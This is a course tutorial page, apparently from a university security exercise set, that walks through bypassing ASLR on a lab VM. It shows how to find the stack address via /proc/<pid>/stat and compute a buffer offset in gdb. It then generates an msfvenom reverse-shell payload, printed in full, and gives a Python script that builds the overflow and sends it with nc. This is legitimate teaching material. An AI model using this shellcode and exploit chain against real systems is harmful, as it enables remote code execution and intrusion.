...
<html xmlns="http://www.w3.org/1999/xhtml">
  <head>
    ...
    <title>Tutorial: ByPassing ASLR - Stack Stethoscope &#8212; Exercises 2022 documentation</title>
    ...
    <link rel="next" title="Tutorial: NFS Share exploit - Shellcode" href="nfsshare2.html" />
    <link rel="prev" title="Tutorial: Handmade Shellcode" href="handmadeshellcode.html" />
...
<li class="toctree-l1 current"><a class="current reference internal" href="#">Tutorial:  ByPassing ASLR - Stack Stethoscope</a><ul>
...
<li><a class="reference internal" href="#">Tutorial:  ByPassing ASLR - Stack Stethoscope</a><ul>
...
<g>
  ...
  <div class="section" id="tutorial-bypassing-aslr-stack-stethoscope">
<h1>Tutorial:  ByPassing ASLR - Stack Stethoscope<a class="headerlink" href="#tutorial-bypassing-aslr-stack-stethoscope" title="Permalink to this headline">¶</a></h1>
<div class="section" id="introduction">
<h2>Introduction<a class="headerlink" href="#introduction" title="Permalink to this headline">¶</a></h2>
<p>Download the sale Metasploitable VM from the tutorial “NFS -
Metasploitable”. This time we will try to bypass ASLR with <strong>stack
stethoscope technique</strong>. So for this exercise, we will have the file
compiled with :</p>
<ul class="simple">
<li>The <code class="docutils literal notranslate"><span class="pre">-g</span></code> indicates that the compiled files contains all information
for debugging with <code class="docutils literal notranslate"><span class="pre">gdb</span></code></li>
<li>The <code class="docutils literal notranslate"><span class="pre">-fno-stack-protector</span></code> indicates that no stack protection are
present</li>
<li>The <code class="docutils literal notranslate"><span class="pre">-z</span> <span class="pre">execstack</span></code> forces gcc to compile code with non-executable
instruction on the stack</li>
</ul>
<p>We also activate randomization of the memory in the admin session:</p>
<div class="code bash highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">sudo</span> <span class="n">cat</span> <span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="n">sys</span><span class="o">/</span><span class="n">kernel</span><span class="o">/</span><span class="n">randomize_va_space</span>
...
<div class="line">As you know, ASLR break the possibility to guess address of the buffer
...
doesn’t. <a class="footnote-reference" href="#id3" id="id1">[1]</a></div>
<div class="line">Since we need the PID of the program, we need to run program. We
decide to exploit the <code class="docutils literal notranslate"><span class="pre">vuln.c</span></code> program that wait for a connection on
port 31338 on localhost and then print the received message. . <a class="footnote-reference" href="#id4" id="id2">[2]</a></div>
<div class="line">Since it only show the address of the bottom of the stack if we are
proprietary of the file, we need change the permission of file such
that the user execute it:</div>
</div>
<div class="code bash highlight-default notranslate"><div class="highlight"><pre><span></span>user@kali:/StackStethoscope$ chmod 755 $FOLDER/vuln
</pre></div>
</div>
<p>❓ <strong>Try</strong> Now from the PID the program, try to find the address of the bottom of
the stack. For that you should remember where you can find such
information/statistics about a processus.</p>
<div class="admonition hint">
<p class="first admonition-title">Hint</p>
<p class="last"><strong>💡 Try to find in</strong> <code class="docutils literal notranslate"><span class="pre">/proc/&lt;pid&gt;/stat</span></code> <strong>file</strong></p>
</div>
<div class="collapse tp1_s0" id="tp1_0_1">
       <div class="panel panel-primary">
             <div class="panel-body"><div class="code bash highlight-default notranslate"><div class="highlight"><pre><span></span>user@kali:/StackStethoscope$ ./vuln &amp; #program now run in backgroud
[1] 8833   #PID
...
<dt>❓ <strong>Try</strong> Since we have the address, we need to compute the “offset” that we</dt>
<dd>were talking before between the bottom of the stack and the buffer
which does not change even with ASLR !</dd>
</dl>
<div class="line-block">
<div class="line">For that, <code class="docutils literal notranslate"><span class="pre">attach</span></code> yourself to the <code class="docutils literal notranslate"><span class="pre">vuln</span></code> program with <code class="docutils literal notranslate"><span class="pre">gdb</span></code> and
inspect the memory and compute the offset.</div>
</div>
<div class="admonition hint">
<p class="first admonition-title">Hint</p>
<p class="last"><strong>💡 Try to print the address of the variable</strong> <code class="docutils literal notranslate"><span class="pre">buf</span></code>.</p>
</div>
<div class="collapse tp1_s0" id="tp1_0_2">
       <div class="panel panel-primary">
             <div class="panel-body"><div class="code bash highlight-default notranslate"><div class="highlight"><pre><span></span>(gdb) attach 8833
...
<dl class="docutils">
<dt>Now we can compute the <strong>offset</strong>:</dt>
<dd><code class="docutils literal notranslate"><span class="pre">0xBFEC1870</span> <span class="pre">-</span> <span class="pre">0xbfec1390</span> <span class="pre">=</span> <span class="pre">0x4E0</span></code>.</dd>
</dl>
</div>
</div>
</div><dl class="docutils">
<dt>❓ <strong>Try</strong> Now we need a shellcode to inject. A good one for this case would be</dt>
<dd>the reverse shell. Try to produce your own shell code or use tools
such as <code class="docutils literal notranslate"><span class="pre">msfvenom</span></code> for that.</dd>
</dl>
<div class="collapse tp1_s0" id="tp1_0_3">
       <div class="panel panel-primary">
         <div class="panel-body"><div class="code bash highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">msfvenom</span> <span class="o">--</span><span class="n">platform</span> <span class="n">linux</span> <span class="o">--</span><span class="n">bad</span><span class="o">-</span><span class="n">chars</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span> <span class="s1">&#39;</span><span class="se">\xff</span><span class="s1">&#39;</span> <span class="s1">&#39;</span><span class="se">\xe7</span><span class="s1">&#39;</span> <span class="s1">&#39;</span><span class="se">\x5b</span><span class="s1">&#39;</span> <span class="s1">&#39;</span><span class="se">\xa0</span><span class="s1">&#39;</span> <span class="s1">&#39;</span><span class="se">\x0d</span><span class="s1">&#39;</span> <span class="s1">&#39;</span><span class="se">\x20</span><span class="s1">&#39;</span>  <span class="o">--</span><span class="n">payload</span> <span class="n">linux</span><span class="o">/</span><span class="n">x86</span><span class="o">/</span><span class="n">shell_reverse_tcp</span>
    <span class="n">LHOST</span><span class="o">=</span><span class="mf">127.0</span><span class="o">.</span><span class="mf">0.1</span> <span class="n">LPORT</span><span class="o">=</span><span class="mi">9001</span> <span class="o">-</span><span class="n">f</span> <span class="n">c</span>

<span class="n">Found</span> <span class="mi">11</span> <span class="n">compatible</span> <span class="n">encoders</span>
<span class="n">Attempting</span> <span class="n">to</span> <span class="n">encode</span> <span class="n">payload</span> <span class="k">with</span> <span class="mi">1</span> <span class="n">iteration</span> <span class="n">of</span> <span class="n">x86</span><span class="o">/</span><span class="n">shikata_ga_nai</span>
...
<span class="n">unsigned</span> <span class="n">char</span> <span class="n">buf</span><span class="p">[]</span> <span class="o">=</span>
<span class="s2">&quot;</span><span class="se">\xba\x1c\x1d\x2d\x9c\xdb\xd9\xd9\x74\x24\xf4\x5e\x33\xc9\xb1\x12\x31\x56\x12\x03\x56</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x12\x83\xda\x19\xcf\x69\xd3\xfa\xf8\x71\x40\xbe\x55\x1c\x64\xc9\xbb\x50\x0e\x04\xbb</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x02\x97\x26\x83\xe9\xa7\x0e\x85\x08\xcf\xef\x75\xeb\x0e\x78\x74\xeb\x33\x51\xf1\x0a</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x83\xc7\x51\x9c\xb0\xb4\x51\x97\xd7\x76\xd5\xf5\x7f\xe7\xf9\x8a\x17\x9f\x2a\x42</span><span class="s2">&quot;</span>
<span class="s2">&quot;</span><span class="se">\x85\x36\xbc\x7f\x1b\x9a\x37\x9e\x2b\x17\x85\xe1</span><span class="s2">&quot;</span><span class="p">;</span>
</pre></div>
</div>
</div>
</div>
</div><p>❓ <strong>Try</strong> Now that we have the offset, create a program that automatically compute
...
<div class="collapse tp1_s0" id="tp1_0_4">
       <div class="panel panel-primary">
     <div class="panel-body"><div class="code python highlight-default notranslate"><div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="n">shell_code</span>     <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\\</span><span class="s2">xba</span><span class="se">\\</span><span class="s2">x1c</span><span class="se">\\</span><span class="s2">x1d</span><span class="se">\\</span><span class="s2">x2d</span><span class="se">\\</span><span class="s2">x9c</span><span class="se">\\</span><span class="s2">xdb</span><span class="se">\\</span><span class="s2">xd9</span><span class="se">\\</span><span class="s2">xd9</span><span class="se">\\</span><span class="s2">x74</span><span class="se">\\</span><span class="s2">x24</span><span class="se">\\</span><span class="s2">xf4</span><span class="se">\\</span><span class="s2">x5e</span><span class="se">\\</span><span class="s2">x33&quot;</span> <span class="o">+</span>\
                     <span class="s2">&quot;</span><span class="se">\\</span><span class="s2">xc9</span><span class="se">\\</span><span class="s2">xb1</span><span class="se">\\</span><span class="s2">x12</span><span class="se">\\</span><span class="s2">x31</span><span class="se">\\</span><span class="s2">x56</span><span class="se">\\</span><span class="s2">x12</span><span class="se">\\</span><span class="s2">x03</span><span class="se">\\</span><span class="s2">x56</span><span class="se">\\</span><span class="s2">x12</span><span class="se">\\</span><span class="s2">x83</span><span class="se">\\</span><span class="s2">xda</span><span class="se">\\</span><span class="s2">x19</span><span class="se">\\</span><span class="s2">xcf</span><span class="se">\\</span><span class="s2">x69&quot;</span> <span class="o">+</span>\
                     <span class="s2">&quot;</span><span class="se">\\</span><span class="s2">xd3</span><span class="se">\\</span><span class="s2">xfa</span><span class="se">\\</span><span class="s2">xf8</span><span class="se">\\</span><span class="s2">x71</span><span class="se">\\</span><span class="s2">x40</span><span class="se">\\</span><span class="s2">xbe</span><span class="se">\\</span><span class="s2">x55</span><span class="se">\\</span><span class="s2">x1c</span><span class="se">\\</span><span class="s2">x64</span><span class="se">\\</span><span class="s2">xc9</span><span class="se">\\</span><span class="s2">xbb</span><span class="se">\\</span><span class="s2">x50</span><span class="se">\\</span><span class="s2">x0e</span><span class="se">\\</span><span class="s2">x04&quot;</span> <span class="o">+</span>\
                     <span class="s2">&quot;</span><span class="se">\\</span><span class="s2">xbb</span><span class="se">\\</span><span class="s2">x02</span><span class="se">\\</span><span class="s2">x97</span><span class="se">\\</span><span class="s2">x26</span><span class="se">\\</span><span class="s2">x83</span><span class="se">\\</span><span class="s2">xe9</span><span class="se">\\</span><span class="s2">xa7</span><span class="se">\\</span><span class="s2">x0e</span><span class="se">\\</span><span class="s2">x85</span><span class="se">\\</span><span class="s2">x08</span><span class="se">\\</span><span class="s2">xcf</span><span class="se">\\</span><span class="s2">xef</span><span class="se">\\</span><span class="s2">x75</span><span class="se">\\</span><span class="s2">xeb&quot;</span> <span class="o">+</span>\
                     <span class="s2">&quot;</span><span class="se">\\</span><span class="s2">x0e</span><span class="se">\\</span><span class="s2">x78</span><span class="se">\\</span><span class="s2">x74</span><span class="se">\\</span><span class="s2">xeb</span><span class="se">\\</span><span class="s2">x33</span><span class="se">\\</span><span class="s2">x51</span><span class="se">\\</span><span class="s2">xf1</span><span class="se">\\</span><span class="s2">x0a</span><span class="se">\\</span><span class="s2">x83</span><span class="se">\\</span><span class="s2">xc7</span><span class="se">\\</span><span class="s2">x51</span><span class="se">\\</span><span class="s2">x9c</span><span class="se">\\</span><span class="s2">xb0</span><span class="se">\\</span><span class="s2">xb4&quot;</span> <span class="o">+</span>\
                     <span class="s2">&quot;</span><span class="se">\\</span><span class="s2">x51</span><span class="se">\\</span><span class="s2">x97</span><span class="se">\\</span><span class="s2">xd7</span><span class="se">\\</span><span class="s2">x76</span><span class="se">\\</span><span class="s2">xd5</span><span class="se">\\</span><span class="s2">xf5</span><span class="se">\\</span><span class="s2">x7f</span><span class="se">\\</span><span class="s2">xe7</span><span class="se">\\</span><span class="s2">xf9</span><span class="se">\\</span><span class="s2">x8a</span><span class="se">\\</span><span class="s2">x17</span><span class="se">\\</span><span class="s2">x9f</span><span class="se">\\</span><span class="s2">x2a</span><span class="se">\\</span><span class="s2">x42&quot;</span> <span class="o">+</span>\
                     <span class="s2">&quot;</span><span class="se">\\</span><span class="s2">x85</span><span class="se">\\</span><span class="s2">x36</span><span class="se">\\</span><span class="s2">xbc</span><span class="se">\\</span><span class="s2">x7f</span><span class="se">\\</span><span class="s2">x1b</span><span class="se">\\</span><span class="s2">x9a</span><span class="se">\\</span><span class="s2">x37</span><span class="se">\\</span><span class="s2">x9e</span><span class="se">\\</span><span class="s2">x2b</span><span class="se">\\</span><span class="s2">x17</span><span class="se">\\</span><span class="s2">x85</span><span class="se">\\</span><span class="s2">xe1&quot;</span>
    <span class="n">padding</span>        <span class="o">=</span> <span class="mi">173</span>
    <span class="n">pid</span>            <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">([</span><span class="s1">&#39;pidof&#39;</span><span class="p">,</span> <span class="s1">&#39;-s&#39;</span><span class="p">,</span> <span class="s1">&#39;echo-server&#39;</span><span class="p">])</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
    <span class="n">path</span>           <span class="o">=</span><span class="s1">&#39;/proc/&#39;</span><span class="o">+</span><span class="n">pid</span><span class="o">+</span><span class="s1">&#39;/stat&#39;</span>
    <span class="n">stat</span>           <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">([</span><span class="s1">&#39;cat&#39;</span><span class="p">,</span><span class="n">path</span><span class="p">])</span>
    <span class="nb">print</span><span class="p">(</span><span class="n">stat</span><span class="p">)</span>
    <span class="n">address_bottom</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">stat</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">)[</span><span class="mi">27</span><span class="p">])</span>
    <span class="nb">print</span><span class="p">(</span><span class="n">address_bottom</span><span class="p">)</span>
    <span class="n">offset</span>         <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="mh">0x4E0</span><span class="p">)</span>
    <span class="n">buf_addr</span>       <span class="o">=</span> <span class="n">address_bottom</span> <span class="o">-</span> <span class="n">offset</span>
    <span class="n">buf_addr</span>       <span class="o">=</span> <span class="nb">hex</span><span class="p">(</span><span class="n">buf_addr</span><span class="p">)</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="s2">&quot;L&quot;</span><span class="p">)</span>
    <span class="n">buf_addr</span>       <span class="o">=</span> <span class="n">parse_address</span><span class="p">(</span><span class="n">buf_addr</span><span class="p">)</span> <span class="c1">#Only trasnform hex address to \x byte address</span>
    <span class="nb">print</span><span class="p">(</span><span class="n">buf_addr</span><span class="p">)</span>
    <span class="n">payload</span>        <span class="o">=</span> <span class="s2">&quot;A&quot;</span> <span class="o">*</span> <span class="n">padding</span> <span class="o">+</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> . </span><span class="se">\&quot;</span><span class="s2">&quot;</span> <span class="o">+</span> <span class="n">shell_code</span> <span class="o">+</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> . </span><span class="se">\&quot;</span><span class="s2">&quot;</span> <span class="o">+</span> <span class="n">buf_addr</span>
    <span class="n">perl_command</span>   <span class="o">=</span> <span class="s1">&#39;cat &lt;(perl -e </span><span class="se">\&#39;</span><span class="s1">print </span><span class="se">\&quot;</span><span class="s1">&#39;</span><span class="o">+</span><span class="n">payload</span><span class="o">+</span><span class="s2">&quot;</span><span class="se">\&quot;\&#39;</span><span class="s2">&quot;</span>
    <span class="n">nc_command</span>     <span class="o">=</span> <span class="s2">&quot;) - | nc localhost 9000&quot;</span>
    <span class="nb">print</span><span class="p">(</span><span class="n">perl_command</span> <span class="o">+</span> <span class="n">nc_command</span><span class="p">)</span> <span class="c1">#Only print command since os.system seems to bug with &#39;(&#39;</span>

<span class="n">main</span><span class="p">()</span>
</pre></div>
</div>
<p>And we finally manage to open a reverse shell !</p>
<a class="sol-img reference internal image-reference" href="../_images/7.PNG"><img alt="../_images/7.PNG" class="sol-img align-center" src="../_images/7.PNG" style="width: 326.2px; height: 210.0px;" /></a>
<br><a class="sol-img reference internal image-reference" href="../_images/8.PNG"><img alt="../_images/8.PNG" class="sol-img align-center" src="../_images/8.PNG" style="width: 661.5px; height: 70.69999999999999px;" /></a>
<br><a class="sol-img reference internal image-reference" href="../_images/9.PNG"><img alt="../_images/9.PNG" class="sol-img align-center" src="../_images/9.PNG" style="width: 655.1999999999999px; height: 224.0px;" /></a>
</div>
</div>
</div><?php
      if($good) {
...
<tbody valign="top">
<tr><td class="label"><a class="fn-backref" href="#id1">[1]</a></td><td><a class="reference external" href="https://pdfs.semanticscholar.org/440e/61ecb744e55d0425cdb648fe24e4ff999686.pdf">https://pdfs.semanticscholar.org/440e/61ecb744e55d0425cdb648fe24e4ff999686.pdf</a></td></tr>
</tbody>
</table>
<table class="docutils footnote" frame="void" id="id4" rules="none">
<colgroup><col class="label" /><col /></colgroup>
<tbody valign="top">
<tr><td class="label"><a class="fn-backref" href="#id2">[2]</a></td><td><a class="reference external" href="https://www.exploit-db.com/papers/13232">https://www.exploit-db.com/papers/13232</a></td></tr>
</tbody>
</table>
</div>
</div>
